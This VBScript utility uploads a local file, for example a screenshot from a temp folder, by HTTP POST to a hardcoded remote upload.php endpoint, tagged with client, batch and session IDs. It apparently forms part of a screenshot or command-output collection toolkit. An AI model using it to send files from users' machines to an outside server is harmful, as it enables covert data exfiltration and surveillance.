Option Explicit
' On Error Resume Next

' cscript http_request_upload_file.vbs .\http_request_upload_file.config %temp%\owd\screenshot_1.png temp.out
' url=http://s1083932807.online-home.ca/ow/upload.php
' batchid=99992222
' filepath=C:\Users\sebas\AppData\Local\Temp\owd
' filename=screenshot_1.png
' clientid=13125170
' source=cmd_list_full.bat
' sessionid=batchid

' http://s1083932807.online-home.ca/ow/upload.php?batchid=%batchid%^&filename=%%F^&clientid=%clientid%^&source=%source%^&sessionid=%sessionid%
' ?batchid=%batchid%^&filename=%%F^&clientid=%clientid%^&source=%source%^&sessionid=%sessionid%
Function IsWScriptRunning()
    Dim hostName
    hostName = LCase(Right(WScript.FullName, 11))

    IsWScriptRunning = False
    
    If hostName = "wscript.exe" Then
        IsWScriptRunning = True
    End If
    
End Function

Function IsNullEmptyOrWhiteSpace(stringToCheck)
    IsNullEmptyOrWhiteSpace = False

    If IsNull(stringToCheck) Or IsEmpty(stringToCheck) Then
        IsNullEmptyOrWhiteSpace = True
        Exit Function
    End If

    If Len(Trim(stringToCheck)) = 0 Then
        IsNullEmptyOrWhiteSpace = True
        Exit Function
    End If
    
End Function

Function FileExists(ByVal filePath)

    If IsNullEmptyOrWhiteSpace(filePath) Then
        FileExists = False
        Exit Function
    End If
    
    Set fso = CreateObject("Scripting.FileSystemObject")

    FileExists = False
    
    If fso.FileExists(filePath) Then
        FileExists = True
    End If

End Function

Function ReadConfig(configfilepath, delim)
    
    If IsNullEmptyOrWhiteSpace(delim) Then
        delim = "="
    End If
    
    Dim dictObj : Set dictObj = CreateObject("Scripting.Dictionary")

    Dim objFSO : Set objFSO = CreateObject("Scripting.FileSystemObject")

    If Not objFSO.FileExists(configfilepath) Then
        WScript.Quit 1
    End If
        
    Dim objFile : Set objFile = objFSO.OpenTextFile(configfilepath, 1) ' 1 -- for reading

    Do Until objFile.AtEndOfStream
        Dim strLine : strLine = objFile.ReadLine
        
        If Trim(strLine) <> "" And InStr(strLine, "=") > 0 Then
            Dim arrParts : arrParts = Split(strLine, "=")
            
            Dim kkey : kkey = Trim(arrParts(0))
            Dim value : value = Trim(arrParts(1))
            
            dictObj.Add kkey, value
        End If
    Loop

    Set ReadConfig = dictObj
    
    objFile.Close

    Set objFile = Nothing
    Set objFSO = Nothing
End Function

Dim fso : Set fso = CreateObject("Scripting.FileSystemObject")

Dim scriptFullPath : scriptFullPath = WScript.ScriptFullName
Dim scriptfname : scriptfname = fso.GetFileName(scriptFullPath)
Dim scriptDirFullPath : scriptDirFullPath = fso.GetParentFolderName(scriptFullPath)
   
Dim configfilepath : configfilepath = scriptDirFullPath & "\" & "http_request.config"

Dim dictObj 
Dim configExists : configExists = False

If WScript.Arguments.Count > 0 Then
    configfilepath = WScript.Arguments(0)
    
    If Not configfilepath = "-" Then
            
        Dim dirpath : dirpath = fso.GetParentFolderName(configfilepath)
        
        If IsNullEmptyOrWhiteSpace(dirpath) Then
            configfilepath = scriptDirFullPath & "\" & configfilepath 
        End If

        set dictObj = ReadConfig(configfilepath, "=")
    
        If NOt dictObj Is Nothing Then
            If dictObj.Count > 0 Then
                configExists = True
            End If
        End If
        
    End If
    
End If


Dim targetUrl

If Not dictObj Is Nothing Then
    If dictObj.Exists("url") Then
        targetUrl = dictObj.Item("url")
    End If
Else
    targetUrl = "http://s1083932807.online-home.ca/ow/upload.php"
End If


Dim filepath
Dim filename
Dim rootpath

If Not dictObj Is Nothing Then
    If dictObj.Exists("filepath") Then

        If dictObj.Exists("filename") Then
            rootpath = dictObj.Item("filepath")
            filename = dictObj.Item("filename")
        End If

    End If
End If

If WScript.Arguments.Count > 1 Then
    filepath = WScript.Arguments(1)
    
    Dim tdirpath : tdirpath = fso.GetParentFolderName(filepath)
    
    If IsNullEmptyOrWhiteSpace(tdirpath) Then
        rootpath = scriptDirFullPath
    Else
        rootpath = tdirpath
    End If
    
    filename = fso.GetFileName(filepath)

End If

filepath = rootpath & "\" & filename

targetUrl = targetUrl & "?"

If Not dictObj Is Nothing Then
    If dictObj.Count > 1 Then

        Dim kkey
        For Each kkey In dictObj.Keys()
            targetUrl = targetUrl & kkey & "=" & dictObj.Item(kkey) & "&"
        Next

        If Len(targetUrl) > 0 Then
            targetUrl = Left(targetUrl, Len(targetUrl) - 1)
        End If
        
    End If

End If

Dim nofilenameset : nofilenameset = True

If Not dictObj Is Nothing Then
    
    If dictObj.Exists("filename") Then
        nofilenameset = False
    End If

End If

If nofilenameset Then
    targetUrl = targetUrl & "&filename=" & filename
End if

' WScript.echo targetUrl

If Not FileExists(filepath) Then
    WScript.Quit 1
End If

Dim fileStream : Set fileStream = CreateObject("ADODB.Stream")
fileStream.Type = 1 ' adTypeBinary
fileStream.Open
fileStream.LoadFromFile filepath

Dim httpReq : Set httpReq = CreateObject("MSXML2.XMLHTTP")
httpReq.Open "POST", targetUrl, False

httpReq.setRequestHeader "Content-Type", "application/octet-stream"

httpReq.Send fileStream.Read

Dim response
response = httpReq.ResponseText

Function WriteOutput(ByVal response)
    If IsNullEmptyOrWhiteSpace(response) Then
        Exit Function
    End If
    
    Dim fso : Set fso = CreateObject("Scripting.FileSystemObject")

    Dim fullpath
    fullpath = "-"
    
    If WScript.Arguments.Count > 2 Then
        fullpath = WScript.Arguments(2)
    End If

    If fullpath = "-" Then
        fullpath = scriptDirFullPath & "\" & scriptfname & ".out"
    Else
        Dim outdirpath : outdirpath = fso.GetParentFolderName(fullpath)
        
        If IsNullEmptyOrWhiteSpace(outdirpath) Then
            fullpath = scriptDirFullPath & "\" & fullpath
        End If
        
    End If
    
    Dim objOutFile: Set objOutFile = fso.CreateTextFile(fullpath, True)

    objOutFile.Write(response)

    objOutFile.Close

    Set objOutFile = Nothing
    Set fso = Nothing

End Function

Call WriteOutput(response)

If Not IsWScriptRunning() Then
    WScript.Echo response
End If

fileStream.Close
Set fileStream = Nothing
Set httpReq = Nothing